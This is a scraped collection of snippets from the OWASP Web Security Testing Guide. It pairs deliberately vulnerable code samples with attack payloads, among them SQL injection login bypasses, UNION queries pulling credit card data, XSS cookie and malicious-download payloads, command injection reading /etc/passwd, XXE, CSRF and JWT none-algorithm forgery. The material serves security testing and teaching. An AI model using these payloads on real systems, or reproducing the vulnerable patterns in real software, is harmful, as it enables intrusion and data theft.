[
  {
    "owner": "owasp",
    "repo": "wstg",
    "content": "TITLE: SQL Injection with OR Condition Bypassing Authentication\nDESCRIPTION: Example of SQL injection payload that bypasses authentication by injecting an OR condition that always evaluates to true, effectively making the entire WHERE clause true regardless of username or password.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'\n```\n\n----------------------------------------\n\nTITLE: Basic SQL Authentication Query Vulnerable to Injection\nDESCRIPTION: A typical SQL query used for user authentication that is vulnerable to SQL injection. This query directly concatenates user input into the SQL statement without proper sanitization.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM Users WHERE Username='$username' AND Password='$password'\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Stored Procedure in SQL Server\nDESCRIPTION: Example of a SQL Server stored procedure vulnerable to SQL injection due to unsanitized user input in dynamic SQL construction.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_28\n\nLANGUAGE: sql\nCODE:\n```\nCreate procedure user_login @username varchar(20), @passwd varchar(20)\nAs\nDeclare @sqlstring varchar(250)\nSet @sqlstring  = '\nSelect 1 from users\nWhere username = ' + @username + ' and passwd = ' + @passwd\nexec(@sqlstring)\nGo\n```\n\n----------------------------------------\n\nTITLE: Vulnerable ORM Query Creation in Java\nDESCRIPTION: This snippet demonstrates a weak ORM implementation that is vulnerable to SQL injection. It directly concatenates user input into the query string without proper sanitization.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nList results = session.createQuery(\"from Orders as orders where orders.id = \" + currentOrder.getId()).list();\nList results = session.createSQLQuery(\"Select * from Books where author = \" + book.getAuthor()).list();\n```\n\n----------------------------------------\n\nTITLE: Basic XSS Payload Examples for Testing\nDESCRIPTION: Two examples of XSS payloads that can be used to test for stored XSS vulnerabilities. One is unencoded and the other URL-encoded, both attempting to execute JavaScript that displays the document's cookies.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\naaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n```\n\nLANGUAGE: html\nCODE:\n```\naaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E\n```\n\n----------------------------------------\n\nTITLE: UNION SELECT Column Type Testing\nDESCRIPTION: SQL injection technique that tests column data types by trying different combinations of values (integers, NULL) in a UNION SELECT statement to determine compatible column types for injection.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_18\n\nLANGUAGE: sql\nCODE:\n```\nhttps://www.example.com/product.php?id=10 UNION SELECT 1,null,null--\n```\n\n----------------------------------------\n\nTITLE: Basic DOM-Based XSS Vulnerability in HTML Script Element\nDESCRIPTION: A simple example of a DOM-based XSS vulnerability where document.location.href is written directly to the page without sanitization, allowing attackers to inject script content after the URL fragment.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script>\ndocument.write(\"Site is at: \" + document.location.href + \".\");\n</script>\n```\n\n----------------------------------------\n\nTITLE: Detecting Reflected XSS Vulnerability in URL Parameter\nDESCRIPTION: This snippet demonstrates how to test for a reflected XSS vulnerability by injecting JavaScript code into a URL parameter. If the code executes, it indicates a vulnerability.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://example.com/index.php?user=<script>alert(123)</script>\n```\n\n----------------------------------------\n\nTITLE: Analyzing PHP Code with Multiple SQL Queries for Injection\nDESCRIPTION: This PHP code snippet demonstrates a scenario where the result of one query is used in another, complicating SQL injection. The vulnerability is in the first query, but exploitation requires manipulating both queries.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_22\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n// retrieves product ID based on product name\n                            --\\\n$query1 = \"SELECT              |\n             id                |\n           FROM                |\n             products          |--\\> vulnerable query #1\n           WHERE               |\n             name = '$name'\";  |\n                            --/\n$result1 = odbc_exec($conn, $query1);\n// retrieves product's comments based on the product ID\n                              --\\\n$query2 = \"SELECT                |\n             comments            |\n           FROM                  |\n             products            |--\\> vulnerable query #2\n           WHERE                 |\n             id = '$result1'\";   |\n                              --/\n$result1 = odbc_exec($conn, $query2);\n?>\n```\n\n----------------------------------------\n\nTITLE: PHP Command Injection Vulnerability Example\nDESCRIPTION: This snippet demonstrates a potential command injection vulnerability in PHP where user input is directly used in a system command without proper sanitization.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nhttps://sensitive/something.php?dir=%3Bcat%20/etc/passwd\n```\n\n----------------------------------------\n\nTITLE: Invalidating Sessions in Java and .NET\nDESCRIPTION: Examples of proper server-side session invalidation methods in Java and .NET frameworks. These methods should be called to ensure sessions are properly terminated on the server when a user logs out or when a session times out.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout.md#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nHttpSession.invalidate()\n```\n\nLANGUAGE: .NET\nCODE:\n```\nSession.abandon()\n```\n\n----------------------------------------\n\nTITLE: Analyzing PHP Code with Independent SQL Queries for Injection\nDESCRIPTION: This PHP code snippet shows a scenario where the same parameter is used in multiple independent queries, complicating SQL injection. The vulnerability exists in both queries, requiring careful exploitation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_23\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n//retrieving product details based on product ID\n$query1 = \"SELECT \n             name, \n             inserted, \n             size \n           FROM \n             products \n           WHERE \n             id = '$id'\";\n$result1 = odbc_exec($conn, $query1);\n//retrieving product comments based on the product ID\n$query2 = \"SELECT \n             comments \n           FROM \n             products \n           WHERE \n             id = '$id'\";\n$result2 = odbc_exec($conn, $query2);\n?>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Flask/Jinja2 Endpoint Implementation\nDESCRIPTION: This Python function using Flask and Jinja2 is vulnerable to SSTI because it directly inserts user input from the 'name' parameter into the template without proper sanitization.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n@app.route(\"/page\")\ndef page():\n    name = request.values.get('name')\n    output = Jinja2.from_string('Hello ' + name + '!').render()\n    return output\n```\n\n----------------------------------------\n\nTITLE: Java Example of Proper IV Generation and AES Encryption\nDESCRIPTION: This snippet shows how to properly generate and use an Initialization Vector (IV) with AES encryption in CBC mode using Java's cryptography APIs.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md#2025-04-22_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nIvParameterSpec iv = new IvParameterSpec(randBytes);\nSecretKeySpec skey = new SecretKeySpec(key.getBytes(), \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\ncipher.init(Cipher.ENCRYPT_MODE, skey, iv);\n```\n\n----------------------------------------\n\nTITLE: SQL Injection Using Logical Operators\nDESCRIPTION: Example of using logical operators (AND, OR) to test for SQL injection vulnerabilities by manipulating the query logic to either return no results or all results.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM products WHERE id_product=10 AND 1=2\n```\n\n----------------------------------------\n\nTITLE: Java Encryption API Usage Examples\nDESCRIPTION: This snippet demonstrates the usage of Java's encryption APIs, including SecretKeyFactory, SecretKeySpec, and Cipher. It highlights the importance of proper algorithm selection and parameter configuration.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md#2025-04-22_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nSecretKeyFactory(SecretKeyFactorySpi keyFacSpi, Provider provider, String algorithm)\nSecretKeySpec(byte[] key, int offset, int len, String algorithm)\nCipher c = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n```\n\n----------------------------------------\n\nTITLE: SSRF Payload Using IP Address to Access Restricted Local Pages\nDESCRIPTION: HTTP request showing an SSRF payload that attempts to access a restricted admin page using the loopback IP address.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md#2025-04-22_snippet_3\n\nLANGUAGE: http\nCODE:\n```\nGET https://example.com/page?page=http://127.0.0.1/admin\n```\n\n----------------------------------------\n\nTITLE: Stacked Query SQL Injection Example\nDESCRIPTION: A demonstration of using stacked queries (multiple queries separated by semicolons) to execute additional SQL statements that may perform malicious actions like inserting unauthorized users.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM products WHERE id_product=10; INSERT INTO users (...)\n```\n\n----------------------------------------\n\nTITLE: Time Delay SQL Injection Query\nDESCRIPTION: Example of a time-based blind SQL injection using MySQL's sleep function to determine database version.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_27\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM products WHERE id_product=10 AND IF(version() like '5%', sleep(10), 'false'))--\n```\n\n----------------------------------------\n\nTITLE: Vulnerable JavaScript Code Using document.write() for HTML Injection\nDESCRIPTION: This code snippet shows how document.write() can create HTML injection vulnerabilities. It extracts a user parameter from the URL and directly writes it to the document without proper sanitization, allowing attackers to inject malicious HTML or JavaScript code.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nvar userposition=location.href.indexOf(\"user=\");\nvar user=location.href.substring(userposition+5);\ndocument.write(\"<h1>Hello, \" + user +\"</h1>\");\n```\n\n----------------------------------------\n\nTITLE: Vulnerable PHP Code Demonstrating Remote File Inclusion\nDESCRIPTION: This PHP code snippet demonstrates a vulnerable implementation that allows Remote File Inclusion (RFI). It extracts a filename from an HTTP request without proper validation and includes it directly, allowing attackers to include malicious remote files.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion.md#2025-04-22_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$incfile = $_REQUEST[\"file\"];\ninclude($incfile.\".php\");\n```\n\n----------------------------------------\n\nTITLE: UNION-based SQL Injection Attack\nDESCRIPTION: Example of a UNION-based SQL injection attack that combines the legitimate query results with results from another table (CreditCardTable), allowing the attacker to extract sensitive credit card information.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_16\n\nLANGUAGE: sql\nCODE:\n```\nSELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable\n```\n\n----------------------------------------\n\nTITLE: Condition Value Response for Error Handling\nDESCRIPTION: Server response containing a complex string of codes and statuses. This example shows how modifying the 'PVValid' value from '-1' to '0' might bypass error conditions and potentially allow authentication as an administrator.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n@0`1`3`3``0`UC`1`Status`OK`SEC`5`1`0`ResultSet`0`PVValid`-1`0`0` Notifications`0`0`3`Command  Manager`0`0`0` StateToolsBar`0`0`0`StateExecToolBar`0`0`0`FlagsToolBar`0\n```\n\n----------------------------------------\n\nTITLE: LDAP Injection in Login Authentication\nDESCRIPTION: Example of a vulnerable LDAP login filter and the payload that can be used to bypass authentication by creating an always-true condition.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: txt\nCODE:\n```\nsearchlogin= \"(&(uid=\"+user+\")(userPassword={MD5}\"+base64(pack(\"H*\",md5(pass)))+\"))\"\n```\n\nLANGUAGE: txt\nCODE:\n```\nuser=*)(uid=*))(|(uid=*\npass=password\n```\n\nLANGUAGE: txt\nCODE:\n```\nsearchlogin=\"(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))\"\n```\n\n----------------------------------------\n\nTITLE: Implementing None Algorithm Attack in JSON\nDESCRIPTION: Example of modifying a JWT header to use the 'none' algorithm, which allows bypassing the signature verification. This is a common vulnerability testing technique for JWTs.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md#2025-04-22_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n        \"alg\": \"none\",\n        \"typ\": \"JWT\"\n}\n```\n\n----------------------------------------\n\nTITLE: Insecure Form-Based Authentication Using HTTP\nDESCRIPTION: This code snippet shows an HTML login form that submits credentials over HTTP rather than HTTPS. This is insecure as the authentication credentials will be transmitted in plaintext and could be intercepted.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"http://example.com/login\">\n    <label for=\"username\">User:</label> <input type=\"text\" id=\"username\" name=\"username\" value=\"\"/><br />\n    <label for=\"password\">Password:</label> <input type=\"password\" id=\"password\" name=\"password\" value=\"\"/>\n    <input type=\"submit\" value=\"Login\"/>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable DOM Manipulation for HTML Stripping in JavaScript\nDESCRIPTION: This code demonstrates a vulnerable implementation of HTML stripping that creates a DOM-based XSS vulnerability. The function creates a temporary DIV element, sets innerHTML from user input, and returns the textContent, which allows attackers to exploit the innerHTML parsing process.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n//Marketo Form Code\nfunction strip(html) {\n    var tmp = document.createElement(\"DIV\");\n    tmp.innerHTML = html;\n    return tmp.textContent || tmp.innerText || \"\";\n}\n\n$('form').submit(function() {\n    $('textarea').val(function() {\n        return strip($(this).val());\n    });\n});\n```\n\n----------------------------------------\n\nTITLE: Examining Authorization Code with PKCE Authorization Request\nDESCRIPTION: Example of an HTTP GET request to the /authorize endpoint using the Authorization Code flow with PKCE. It contains the essential parameters including code_challenge and code_challenge_method for PKCE implementation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses.md#2025-04-22_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nGET /authorize\n    ?redirect_uri=https%3A%2F%2Fclient.example.com%2F\n    &client_id=<some_client_id>\n    &scope=openid%20profile%20email\n    &response_type=code\n    &response_mode=query\n    &state=<random_state>\n    &nonce=<random_nonce>\n    &code_challenge=<random_code_challenge>\n    &code_challenge_method=S256 HTTP/1.1\nHost: as.example.com\n[...]\n```\n\n----------------------------------------\n\nTITLE: Vulnerable HTML/JavaScript Example for DOM-Based HTML Injection Testing\nDESCRIPTION: This code demonstrates a vulnerable jQuery implementation from a DOM XSS exercise. It uses location.hash without proper sanitization to manipulate DOM elements, creating an opportunity for HTML injection through the fragment identifier in the URL.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"../js/jquery-1.7.1.js\"></script>\n<script>\nfunction setMessage(){\n    var t=location.hash.slice(1);\n    $(\"div[id=\"+t+\"]\").text(\"The DOM is now loaded and can be manipulated.\");\n}\n$(document).ready(setMessage  );\n$(window).bind(\"hashchange\",setMessage)\n</script>\n<body>\n    <script src=\"../js/embed.js\"></script>\n    <span><a href=\"#message\" > Show Here</a><div id=\"message\">Showing Message1</div></span>\n    <span><a href=\"#message1\" > Show Here</a><div id=\"message1\">Showing Message2</div>\n    <span><a href=\"#message2\" > Show Here</a><div id=\"message2\">Showing Message3</div>\n</body>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable PHP Script with Regex-Based XSS Protection\nDESCRIPTION: A PHP script attempting to filter out XSS attacks by using a regular expression to detect and block script tags with external sources. The implementation has a vulnerability that can be bypassed.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md#2025-04-22_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?\n    $re = \"/<script[^>]+src/i\";\n\n    if (preg_match($re, $_GET['var']))\n    {\n        echo \"Filtered\";\n        return;\n    }\n    echo \"Welcome \".$_GET['var'].\" !\";\n?>\n```\n\n----------------------------------------\n\nTITLE: UNION SELECT with Invalid ID to Force Secondary Results\nDESCRIPTION: SQL injection technique that uses an invalid ID value (99999) to ensure the original query returns no results, forcing the application to display the results of the injected UNION SELECT query instead.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_19\n\nLANGUAGE: sql\nCODE:\n```\nhttps://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--\n```\n\n----------------------------------------\n\nTITLE: Exploiting XSS in HTML Attribute\nDESCRIPTION: This snippet demonstrates how XSS can be performed by injecting malicious code into an HTML attribute value, bypassing filters that may block script tags.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"text\" name=\"state\" value=\"INPUT_FROM_USER\">\n```\n\nLANGUAGE: text\nCODE:\n```\n\" onfocus=\"alert(document.cookie)\n```\n\n----------------------------------------\n\nTITLE: Vulnerable MongoDB Query with User Input\nDESCRIPTION: Example of a vulnerable MongoDB query that directly incorporates user input into a $where clause, potentially allowing JavaScript injection\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\ndb.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits < $userInput; } } );;\n```\n\n----------------------------------------\n\nTITLE: XML External Entity (XXE) Injection Test in XML\nDESCRIPTION: Shows an example of testing for XXE vulnerabilities by attempting to read the /dev/random file.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [ <!ELEMENT foo ANY >\n        <!ENTITY xxe SYSTEM \"file:///dev/random\" >]>\n        <foo>&xxe;</foo>\n```\n\n----------------------------------------\n\nTITLE: Exploiting CSRF with HTML Form Submission in JavaScript\nDESCRIPTION: This HTML snippet demonstrates a CSRF attack using a self-submitting form. It automatically submits a POST request to the target website with predefined credentials upon page load.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<html>\n<body onload='document.CSRF.submit()'>\n\n<form action='https://targetWebsite/Authenticate.jsp' method='POST' name='CSRF'>\n    <input type='hidden' name='name' value='Hacked'>\n    <input type='hidden' name='password' value='Hacked'>\n</form>\n\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Java Archive Extraction Code\nDESCRIPTION: Example of vulnerable Java code that extracts ZIP archives without validating file paths, making it susceptible to directory traversal attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md#2025-04-22_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nEnumeration<ZipEntry> entries =​ ​zip​.g​etEntries();\n\nwhile(entries​.h​asMoreElements()){\n    ZipEntry e ​= ​entries.nextElement();\n    File f = new File(destinationDir, e.getName());\n    InputStream input = zip​.g​etInputStream(e);\n    IOUtils​.c​opy(input, write(f));\n}\n```\n\n----------------------------------------\n\nTITLE: Executing User Input in ASP Code\nDESCRIPTION: This ASP code snippet demonstrates a vulnerable implementation where user input from a \"Data\" parameter is written to a file and then executed. This creates a code injection vulnerability as the user-supplied data is executed as code without proper validation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: asp\nCODE:\n```\n<%\nIf not isEmpty(Request( \"Data\" ) ) Then\nDim fso, f\n'User input Data is written to a file named data.txt\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet f = fso.OpenTextFile(Server.MapPath( \"data.txt\" ), 8, True)\nf.Write Request(\"Data\") & vbCrLf\nf.close\nSet f = nothing\nSet fso = Nothing\n\n'Data.txt is executed\nServer.Execute( \"data.txt\" )\n\nElse\n%>\n\n<form>\n<input name=\"Data\" /><input type=\"submit\" name=\"Enter Data\" />\n\n</form>\n<%\nEnd If\n%>)))\n```\n\n----------------------------------------\n\nTITLE: Examining Authorization Code Grant with PKCE in HTTP Request\nDESCRIPTION: Example of an HTTP POST request to the /oauth/token endpoint using the Authorization Code grant with PKCE. This shows the expected parameters including client_id, code_verifier, grant_type, code, and redirect_uri.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nPOST /oauth/token HTTP/1.1\nHost: as.example.com\n[...]\n\n{\n  \"client_id\":\"example-client\",\n  \"code_verifier\":\"example\",\n  \"grant_type\":\"authorization_code\",\n  \"code\":\"example\",\n  \"redirect_uri\":\"https://client.example.com\"\n}\n```\n\n----------------------------------------\n\nTITLE: Exploiting XSS to Modify Page Content\nDESCRIPTION: This example shows how an XSS vulnerability can be exploited to modify page content, specifically changing a download link to point to a malicious file.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md#2025-04-22_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nhttps://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName(\"a\");AllLinks[0].href = \"https://badexample.com/malicious.exe\";}</script>\n```\n\n----------------------------------------\n\nTITLE: Injecting OS Command in HTTP POST Request\nDESCRIPTION: This snippet demonstrates how to modify a POST request to include an OS command injection. It appends a directory listing command to the document name.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\nPOST /public/doc HTTP/1.1\nHost: www.example.com\n[...]\nReferer: https://127.0.0.1/WebGoat/attack?Screen=20\nCookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5\nAuthorization: Basic T2Vbc1Q9Z3V2Tc3e=\nContent-Type: application/x-www-form-urlencoded\nContent-length: 33\n\nDoc=Doc1.pdf+|+Dir c:\\\n```\n\n----------------------------------------\n\nTITLE: Using OPENROWSET for Port Scanning in SQL Server\nDESCRIPTION: This query uses OPENROWSET to attempt a connection to a specified address and port, which can be used to scan for open ports on a network. The query's error messages or response time can indicate whether the port is open or closed.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md#2025-04-22_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nselect * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--\n```\n\n----------------------------------------\n\nTITLE: Testing Parameter-Based Database Record Retrieval for IDOR\nDESCRIPTION: This example shows a URL pattern where the invoice parameter is directly used to retrieve database records, potentially allowing unauthorized access to other users' data if not properly secured.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://foo.bar/somepage?invoice=12345\n```\n\n----------------------------------------\n\nTITLE: jQuery-based CSS Injection Attack Vector\nDESCRIPTION: This code shows a CSS injection vulnerability using jQuery, where user input from location.hash is directly inserted into the style attribute of an HTML element without proper validation or sanitization.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<a id=\"a1\">Click me</a>\n<b>Hi</b>\n<script>\n    $(\"a\").click(function(){\n        $(\"b\").attr(\"style\",\"color: \" + location.hash.slice(1));\n    });\n</script>\n```\n\n----------------------------------------\n\nTITLE: Exploited User Creation HTTP Request\nDESCRIPTION: An HTTP POST request that exploits mass assignment vulnerability by adding the isAdmin parameter, which was not intended to be set by regular users. This demonstrates how an attacker can gain admin privileges.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md#2025-04-22_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nPOST /createUser\n[...]\nusername=bob&password=supersecretpassword&email=bob@domain.test&isAdmin=true\n```\n\n----------------------------------------\n\nTITLE: Forged HTTP POST Request with XSS Payload in Image File\nDESCRIPTION: An example of a forged HTTP POST request that exploits MIME type mishandling to execute JavaScript. The file appears to be a GIF image but has an HTML content type and contains JavaScript code.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md#2025-04-22_snippet_6\n\nLANGUAGE: html\nCODE:\n```\nContent-Disposition: form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.gif\"\nContent-Type: text/html\n\n<script>alert(document.cookie)</script>\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Format String Usage in C\nDESCRIPTION: Example showing a vulnerable printf call in C that directly passes user input as a format string, allowing attackers to potentially cause information disclosure or code execution by injecting format specifiers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: c\nCODE:\n```\nchar *userName = /* input from user controlled field */;\n\nprintf(\"DEBUG Current user: \");\n// Vulnerable debugging code\nprintf(userName);\n```\n\n----------------------------------------\n\nTITLE: Insecure CORS Configuration Example with Wildcard Origin and Credentials\nDESCRIPTION: An example of an insecure CORS configuration showing incompatible headers. The wildcard Access-Control-Allow-Origin cannot be used together with Access-Control-Allow-Credentials set to true according to the CORS specification.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_0\n\nLANGUAGE: 